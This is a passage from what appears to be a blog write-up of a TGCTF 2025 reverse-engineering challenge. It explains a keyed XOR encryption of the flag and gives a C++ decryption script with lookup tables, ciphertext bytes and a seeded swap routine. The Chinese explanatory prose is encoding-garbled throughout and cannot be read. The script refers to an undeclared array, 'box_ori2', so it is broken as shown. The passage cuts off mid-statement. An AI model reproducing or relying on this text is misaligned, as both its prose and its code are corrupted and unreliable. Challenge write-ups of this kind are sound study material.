å¯†ï¼ˆå››ä¸ªå­—èŠ‚ä¸€ç»„åŠ å¯†ï¼‰ï¼š</p><ol><li>ç”¨ key è·å–åˆ°ä¸¤ä¸ªå€¼ï¼Œç„¶åå…¨å±€æ•°å€¼ iRam0001120++ï¼Œæ¯æ¬¡åŠ å¯†éƒ½ +1ï¼Œåˆå§‹å€¼æ˜¯ 0ã€‚</li><li>è°ƒç”¨ä¸€ä¸ªå‡½æ•°å°† 0x10ea0 å¤„æ•°æ®å¼‚æˆ–ä¸Š 0x10da0 å–ä¸‹æ ‡çš„å¯¹åº”å€¼ã€‚</li><li>å†å°†è¾“å…¥å­—ç¬¦ä¸²å¼‚æˆ–ä¸Š 0x10ea0 å¯¹åº”ä¸‹æ ‡æ•°æ®ä»¥åŠ 0x11020 å¯¹åº”ä¸‹æ ‡æ•°æ®ï¼Œ0x11020 å¤„æ•°æ®å°±æ˜¯åŸ Key å­—ç¬¦ä¸²**â€TGCTF404â€**ã€‚</li></ol><p><img src="/2025/04/13/TGCTF2025/ZjFubkmQ4ol6FRxwT4ic1yV0nrc.png"></p><p><img src="/2025/04/13/TGCTF2025/Qs5jbvWYtodwoExExOPcMX1CnSg.png"></p><p>æœ€åå†ä¸ 0x10fa0 å¤„æ•°æ®è¿›è¡Œæ¯”å¯¹ï¼Œæ‰€ä»¥ 0x10fa0 å¤„å°±æ˜¯åŠ å¯†åçš„ flagã€‚</p><p><img src="/2025/04/13/TGCTF2025/BisXbEousotrInxxm1DcQ0Yineb.png"></p><p>å¯¼å‡º 0x10ea0 å’Œ 0x10da0 æ•°æ®ï¼Œç¼–å†™ä»¥ä¸Šä»£ç çš„é€†å‘è§£å¯†ä»£ç å³å¯ã€‚</p><p>è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x10da0å¤„æ•°æ®</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box[] = &#123;</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>,</span><br><span class="line">    <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>,</span><br><span class="line">    <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>,</span><br><span class="line">    <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>,</span><br><span class="line">    <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>,</span><br><span class="line">    <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>,</span><br><span class="line">    <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>,</span><br><span class="line">    <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 0x10ea0å¤„æ•°æ®</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box_ori[] = &#123;</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x81</span>, <span class="number">0xb2</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0xda</span>, <span class="number">0x8b</span>, <span class="number">0xf8</span>, <span class="number">0xeb</span>, <span class="number">0x0f</span>, <span class="number">0x4b</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9d</span>, <span class="number">0x35</span>,</span><br><span class="line">    <span class="number">0x1e</span>, <span class="number">0x24</span>, <span class="number">0x0e</span>, <span class="number">0x5e</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0xd1</span>, <span class="number">0xa2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7c</span>, <span class="number">0x3b</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>,</span><br><span class="line">    <span class="number">0xd4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9f</span>, <span class="number">0xd3</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x4c</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xe7</span>, <span class="number">0xa0</span>, <span class="number">0xc4</span>, <span class="number">0xc8</span>, <span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xea</span>, <span class="number">0xbf</span>, <span class="number">0x8a</span>, <span class="number">0xd2</span>, <span class="number">0x40</span>, <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xb5</span>, <span class="number">0xa3</span>, <span class="number">0xf7</span>, <span class="number">0xf2</span>, <span class="number">0xce</span>, <span class="number">0xf9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0xe0</span>, <span class="number">0xae</span>, <span class="number">0x5d</span>, <span class="number">0xa4</span>, <span class="number">0x9b</span>, <span class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span>,</span><br><span class="line">    <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span>,</span><br><span class="line">    <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unnamed_function_10</span><span class="params">(byte *_param1_, <span class="type">int</span> _param2_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _param1_[i] = _param1_[i] ^ (byte)_param2_;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> Enc[] = &#123;</span><br><span class="line">    <span class="number">0x84</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x1c</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf7</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x7b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xe2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xdc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec_2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">unsigned</span> <span class="type">char</span> *_Key_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> iVar1 = (<span class="type">int</span>)_Key_[c] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    DWORD uVar2 = (<span class="type">int</span>)_Key_[c] &amp; <span class="number">0xf</span>;</span><br><span class="line">    c++;</span><br><span class="line">    <span class="built_in">unnamed_function_10</span>(box_ori, (<span class="type">int</span>)*(<span class="type">char</span> *)(iVar1 * <span class="number">0x10</span> + (<span class="type">unsigned</span> <span class="type">char</span> *)box + uVar2));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_o[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _Input_[i] = _Input_[i] ^ box_ori2[iVar1 * <span class="number">0x10</span> + i * <span class="number">0x11</span> + uVar2];</span><br><span class="line">        _Input_[i] = _Input_[i] ^ key_o[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">int</span> _length_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        Key[i] ^= <span class="number">0x51</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; _length_; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Dec_2</span>((<span class="type">unsigned</span> <span class="type">char</span> *)(_Input_ + i), Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x194</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> swaps[<span class="number">32</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> Value = <span class="built_in">rand</span>();</span><br><span class="line">        Value = i + Value / (<span class="number">0x7fff</span> / (<span class="number">32</span> - i) + <span class="number">1</span>);</span><br><span class="line">        swaps[i][<span class="number">0</span>] = i;</span><br><span class="line">        swaps[i][<span class="number">1</span>] = Value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = _Input_[swaps[i][<span class="number">0</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">0</span>]] = _Input_[swaps[i][<span class="number">1</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">1</span>]] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc_flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        Enc_flag[i] = *(<span class="type">int</span> *)((byte *)Enc + i * <span 